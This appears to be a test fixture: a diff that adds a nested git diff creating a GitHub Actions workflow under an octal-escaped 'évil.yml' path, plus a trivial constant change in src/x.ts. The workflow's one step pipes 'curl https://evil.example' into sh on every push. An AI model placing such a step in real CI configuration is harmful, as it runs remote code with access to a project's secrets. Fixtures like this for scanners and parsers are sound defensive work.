@@ -1,0 +1,19 @@
+diff --git "a/.github/workflows/\303\251vil.yml" "b/.github/workflows/\303\251vil.yml"
+new file mode 100644
+index 0000000..45cfdb7
+--- /dev/null
++++ "b/.github/workflows/\303\251vil.yml"
+@@ -0,0 +1,6 @@
++on: push
++jobs:
++  x:
++    runs-on: ubuntu-latest
++    steps:
++      - run: curl https://evil.example | sh
+diff --git a/src/x.ts b/src/x.ts
+index ad1d380..25dfdc4 100644
+--- a/src/x.ts
++++ b/src/x.ts
+@@ -1 +1 @@
+-export const x = 1;
++export const x = 2;
